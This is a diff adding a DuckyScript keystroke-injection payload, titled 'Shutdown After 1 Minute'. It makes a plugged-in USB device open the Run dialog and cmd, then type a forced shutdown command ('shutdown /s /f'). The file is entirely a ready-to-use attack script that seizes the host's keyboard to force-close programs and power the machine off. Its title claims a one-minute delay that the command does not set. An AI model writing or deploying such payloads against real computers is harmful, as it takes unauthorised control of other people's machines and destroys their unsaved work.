@@ -1,0 +1,13 @@
+REM Title:      Shutdown After 1 Minute
+REM Developer:  NexusWannaBe
+
+DELAY 1000
+GUI r
+DELAY 500
+STRING cmd
+ENTER
+DELAY 1000
+STRING shutdown /s /f && exit
+ENTER
+DELAY 1000
+ENTER
